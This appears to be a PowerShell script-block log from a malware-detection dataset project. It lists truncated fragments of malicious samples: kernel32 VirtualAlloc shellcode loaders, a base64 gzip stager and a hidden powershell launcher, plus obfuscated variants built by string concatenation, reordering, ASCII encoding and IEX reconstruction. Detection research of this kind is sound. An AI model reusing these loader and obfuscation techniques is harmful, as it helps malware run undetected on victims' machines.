"8/6/2026 9:34:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1043.ps1","2576","(('4hRBel = Cft[D'+'l'+'lImport(7YJkernel32.dll7YJ)]public static extern IntPtr '+'VirtualAlloc(IntPtr lpAddress, '+'uint dwSize, uint flAllocationType'+', uint flProtect);[DllImport(7YJkernel3'+'2.dl"
"8/6/2026 9:34:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:16 AM","","2244","$Bel = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:34:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1043.ps1","23","{ ([INT]$_-AS [ChAR]) }"
"8/6/2026 9:34:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1043.ps1","7716","&( $sheLliD[1]+$SHeLLID[13]+'X')(('36;66;101;108}32<61W32Y39e91e68W108<108r73Y109<112,111<114,116Y40Y34;107r101,114,110e101r108~51<50~46~100<108,108r34Y41~93;112<117Y98e108~105<99}32r115;116;97e116r10"
"8/6/2026 9:34:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1043.ps1","2244","$Bel = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:34:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1039.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:52 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1039.ps1","2794","((""{27}{13}{0}{9}{7}{16}{26}{22}{44}{15}{24}{38}{21}{1}{31}{2}{19}{42}{30}{32}{35}{33}{4}{12}{5}{39}{11}{37}{14}{45}{28}{10}{6}{17}{18}{41}{43}{3}{40}{23}{36}{46}{25}{20}{34}{29}{8}"" -f 'nm)]public st"
"8/6/2026 9:33:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:44 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1039.ps1","2620"," ('w1Rc = qYU[DllImport(TcGk'+'ernel32.dllTcG)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(TcGkernel32'+'.'+'dllTcG)]publi"
"8/6/2026 9:33:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1039.ps1","22","{( [int]$_-As[ChaR]) }"
"8/6/2026 9:33:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1039.ps1","7653"," ( '36@99}32G61A32:39:91G68A108G108d73V109P112}111@114G116@40:34G107d101t114V110@101o108V51A50t46A100@108:108:34:41d93:112:117}98t108:105P99:32t115G116G97V116o105t99d32o101:120d116t101V114P110V32d73}1"
"8/6/2026 9:33:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1039.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:33:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:33:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:33:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:33:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1","2963"," ((""{9}{57}{26}{15}{16}{38}{35}{69}{28}{47}{45}{0}{61}{49}{18}{24}{68}{12}{53}{5}{58}{11}{21}{31}{33}{14}{10}{7}{48}{27}{62}{37}{56}{50}{19}{64}{1}{29}{63}{59}{13}{65}{22}{51}{44}{4}{25}{39}{3}{36}{52"
"8/6/2026 9:33:04 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:33:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\102.ps1","2647"," & ((gET-VaRiABLE '*Mdr*').name[3,11,2]-JoiN'') ( ('aYUc = '+'dhE[DllImport(liBkernel32.dllliB)]public static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint f"
"8/6/2026 9:32:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:56 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","25","{ ( [InT] $_-aS [cHar]) }"
"8/6/2026 9:32:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","7757","""$( seT-IteM  'vARIAbLe:OfS' '')""+[sTrinG]( '36t99;32c61V32;39V91}68}108}108x73c109x112:111F114x116;40,34,107V101F114}110:101F108x51c50;46}100t108,108,34;41t93t112t117O98}108}105V99,32V115,116O97;116}"
"8/6/2026 9:32:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:47 AM","C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1016.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:32 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1016.ps1","3045","(((""{36}{22}{25}{10}{61}{6}{64}{71}{3}{59}{34}{37}{62}{29}{31}{41}{38}{44}{70}{18}{66}{57}{4}{11}{30}{39}{45}{19}{67}{20}{48}{43}{54}{49}{16}{1}{23}{58}{40}{55}{69}{28}{24}{5}{13}{65}{56}{8}{14}{60}{2"
"8/6/2026 9:32:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:24 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1016.ps1","2782","(('6'+'Src = TwI[DllImport(lxYkernel32.dlllxY)]public stat'+'ic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(lxYkernel32.dlllxY)]public s"
"8/6/2026 9:32:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:16 AM","","2322","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1016.ps1","20","{( [chAr] [INT] $_)}"
"8/6/2026 9:32:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1016.ps1","7949","&( $sHELLiD[1]+$ShElliD[13]+'x')(""$( SeT  'OFS' '')""+ [sTRiNg]('36p99@32Y61@32R39R91l68s108&108_73Y109l112B111@114p116_40&34l107&101l114&110Y101B108@51s50l46_100@108B108l34Y41B93B112@117Y98O108B105Y99"
"8/6/2026 9:32:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:32:07 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1016.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:32:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:32:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:32:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:32:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1014.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:31:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:51 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:31:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1014.ps1","2925","(((""{68}{64}{10}{53}{60}{15}{48}{5}{37}{26}{54}{29}{30}{4}{49}{50}{18}{52}{19}{69}{16}{63}{36}{2}{22}{65}{8}{6}{56}{51}{33}{32}{45}{62}{20}{25}{55}{17}{13}{14}{47}{7}{38}{67}{40}{27}{12}{31}{57}{3}{24"
"8/6/2026 9:31:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:43 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:31:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1014.ps1","2573","(('y3xc = 86U[DllImport(1ICkerne'+'l32.dll1'+'IC)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType,'+' '+'uint flProtect);[DllImport(1ICkernel32.dll1IC)]pu"
"8/6/2026 9:31:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:35 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:31:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1014.ps1","22","{( [InT]$_-AS [chaR])}"
"8/6/2026 9:31:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1014.ps1","7667"," .( $eNv:COMspec[4,26,25]-jOIN'') ( ( '36b99F32u61!32u39u91F68F108u108&73m109_112m111m114-116u40F34!107%101-114_110&101m108-51!50_46!100u108b108d34_41-93u112-117F98%108b105u99!32F115F116-97F116d105m99"
"8/6/2026 9:31:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1014.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:31:22 AM","","9","$global:?"
"8/6/2026 9:31:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:22 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:31:22 AM","","538","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:22 AM","","2658","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:21 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi"
"8/6/2026 9:31:20 AM","","9","$global:?"
"8/6/2026 9:31:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1012.ps1","2330","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=n`E`W-ObjeCT System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-no"
"8/6/2026 9:31:15 AM","","9","$global:?"
"8/6/2026 9:31:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:14 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:31:14 AM","","538","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:14 AM","","2658","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:14 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi"
"8/6/2026 9:31:12 AM","","9","$global:?"
"8/6/2026 9:31:12 AM","","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:31:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1012.ps1","2920"," ((""{12}{26}{7}{1}{45}{38}{30}{34}{46}{8}{36}{6}{13}{23}{32}{15}{29}{40}{19}{3}{35}{44}{14}{47}{24}{9}{27}{42}{11}{16}{10}{43}{31}{20}{37}{28}{25}{48}{33}{4}{22}{0}{21}{5}{18}{2}{17}{39}{41}""-f 'o3K3t"
"8/6/2026 9:31:07 AM","","9","$global:?"
"8/6/2026 9:31:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:31:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:31:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:31:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:31:07 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:31:07 AM","","538","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:07 AM","","2658","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:31:06 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi"
"8/6/2026 9:31:05 AM","","9","$global:?"
"8/6/2026 9:31:05 AM","","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:31:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1012.ps1","2779","&( $pSHoMe[21]+$Pshome[30]+'x') ( (('if(['+'IntPtr]::Size -eq 4){eXdb=TNBpowershell.exeTNB}else{eXdb=eXdenv:windir+TNB'+'h05syswow64h05WindowsPowerShellh05v1.0h05powershell.exeTNB};eXds=New-O'+'bject "
"8/6/2026 9:31:00 AM","","9","$global:?"
"8/6/2026 9:30:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:59 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:30:59 AM","","538","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:30:59 AM","","2658","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:30:58 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi"
"8/6/2026 9:30:57 AM","","9","$global:?"
"8/6/2026 9:30:57 AM","","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:30:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1012.ps1","18","{([ChAr][INt] $_)}"
